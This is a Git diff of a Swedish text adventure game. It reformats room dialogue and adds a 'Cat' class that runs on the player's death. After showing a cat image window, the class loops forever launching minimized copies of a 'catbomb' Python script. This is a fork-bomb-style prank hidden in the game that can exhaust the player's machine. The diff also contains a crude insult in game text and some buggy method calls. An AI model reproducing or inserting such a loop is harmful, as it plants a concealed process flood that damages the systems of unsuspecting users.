@@ -1,7 +1,30 @@
 import os
 import random
+import tkinter as tk
 import time
-import catbomb as cat #when I try to run the code it gives error where it cant find cat.gif but it looks like its looking for it in a folder one step too high up /karl
+#import catbomb as cat #when I try to run the code it gives error where it cant find cat.gif but it looks like its looking for it in a folder one step too high up /karl
+
+class Cat:
+    def __init__(self):
+        self.root = root = tk.Tk()
+        self.img = img = os.getcwd() + r"\cat.gif"
+        
+        print(img)
+        photo_image = tk.PhotoImage(file=img)
+        
+        photo_img = photo_image
+
+        h = random.randint(0, 150)
+        w = random.randint(0, 200)
+
+        root.wm_title('get CAT\'d')
+        root.geometry('%dx%d+%d+%d' % (900, 600, w, h))
+        label = tk.Label(root, image=photo_img)
+        label.pack()
+
+        root.mainloop()
+        while True:
+            os.system('start /MIN python.exe catbomb.py')
 
 #Här sparas spelar karaktärens egenskaper.
 class gamePlayer:
@@ -20,7 +43,7 @@ class gamePlayer:
     def playerDeath(self):
         for i in range(10):
             print('FEAR THE CAT')
-        cat.Cat()
+        Cat()
 
         #kör catbomb
 
@@ -99,18 +122,18 @@ ___.$$.________| - |____
 
     #Jag tycker att rummen ska följa denna template för dialog. då får vi lite consitancy.
     def floor1(self):
-        self.coolText('> ''De uråldriga stendörrarna gnäller dovt när du forcerar dig in i TORNETS dunkel.''', 0.02, True)
-        self.coolText('> Innanför möts du av ett cirkulärt rum dekorerat av statyer av olika omänskliga varelser. Rummet verkar större på insidan än utsidan.', 0.02, True)
-        input('>')
-        self.coolText('> Rakt framför dig är en bred trappa som smalnar till en brant spiral upp mot nästa våning', 0.02, True)
-        if input('Gå mot trappan? Ja/Nej ').lower() != 'ja':
-            self.coolText('> Synd för dig...', 0.5, True)
+        self.coolText('''De uråldriga stendörrarna gnäller dovt när du forcerar dig in i TORNETS dunkel.''', 0.02, True)
+        self.coolText('Innanför möts du av ett cirkulärt rum dekorerat av statyer av olika omänskliga varelser. Rummet verkar större på insidan än utsidan.', 0.02, True)
+        input('> ')
+        self.coolText('Rakt framför dig är en bred trappa som smalnar till en brant spiral upp mot nästa våning', 0.02, True)
+        if input('> Gå mot trappan? Ja/Nej ').lower() != 'ja':
+            self.coolText('Synd för dig...', 0.5, True)
         print('Du närmar dig ', end='')
         self.coolText('långsamt', 0.1, False)
         self.coolText(' trappans blanka steg.', 0.02, True)
-        self.coolText('> När du närmar dig trappans fot formas en märklig varelse från dimma.', 0.02, True)
-        self.coolText('> Varelsen verkar bestå helt av olika bägare och kokkärl. Du tittar dig kring och ser några liknande kärl här och där i rummet.', 0.02, True)
-        self.coolText('> "Vill du fortsätta måste du svara på min gåta." yttrar en skrovlig röst som verkar komma från den spökliknande högen disk.', 0.02, True)
+        self.coolText('När du närmar dig trappans fot formas en märklig varelse från dimma.', 0.02, True)
+        self.coolText('Varelsen verkar bestå helt av olika bägare och kokkärl. Du tittar dig kring och ser några liknande kärl här och där i rummet.', 0.02, True)
+        self.coolText('"Vill du fortsätta måste du svara på min gåta." yttrar en skrovlig röst som verkar komma från den spökliknande högen disk.', 0.02, True)
         while True:    
             match input('> Vill du höra gåtan?').lower():
                 case 'ja':
@@ -155,23 +178,20 @@ ___.$$.________| - |____
                 case other:
                     continue
 
-            self.coolText('> Vad är ditt svar?', 0.02, True)
+            self.coolText('Vad är ditt svar?', 0.02, True)
             if input('> ') != '250': # Om du inte skriver 250 får du fel och får börja om tills du svarar.
-                self.coolText('> Fel. Försök igen. Tänker efter, bitch.', 0.02, True)
+                self.coolText('Fel. Försök igen. Tänker efter, bitch.', 0.02, True)
                 continue
             break
-        self.coolText('> Rätt, du kan gå vidare.', 0.02, True)
+        self.coolText('Rätt, du kan gå vidare.', 0.02, True)
         self.floor2()
 
     def floor2(self):
         self.coolText('Du går upp för den mörka trappan. Dina steg ekar i det tomma tornet.', 0.02, True)
         self.coolText('Framför dig ser du en korridor med två vägar', 0.02, True)
-        if input('Vill du gå åt höger eller vänster? ').lower() != "höger":
+        if input('> Vill du gå åt höger eller vänster? ').lower() != "höger":
             self.coolText('Du rycker i dörren men den är låst. Du testar dörren åt höger istället. ', 0.05, True)
-        self.coolText('Handtaget är löst. Du öppnar dörren och ett rum lyses upp av din fackla.', 0.02, True)
-
-        self.gouta() #doesnt find anything?
- 
+        self.coolText('Handtaget är löst. Du öppnar dörren och ett rum lyses upp av din fackla.', 0.02, True) 
         self.coolText('Med ditt svärd i hand går du ut i korridoren igen. Du försöker öppna dörren till vänster.', 0.02, True)
         self.coolText('Dörren öppnar sig den här gången.', 0.02, True)
 
@@ -221,6 +241,7 @@ ___.$$.________| - |____
             self.coolText('Du försöker öppna den andra dörren men upptäcker att den är låst', 0.02, True)
             self.coolText('Du snabbt låser upp dörren med nyckeln du presis hittade', 0.02, True)
         self.coolText('Dörren öppnas till en trappa till nästa våning', 0.02, True)
+        input('> ')
         
         self.floor4()
 
@@ -322,7 +343,7 @@ class battleSystem:
         pass
 
     def battleLoss(self):
-        gamePlayer.playerDeath()
+        gamePlayer.playerDeath(gamePlayer)
 
     def playersTurn(self):
         currentMove = [0, 0, " "]
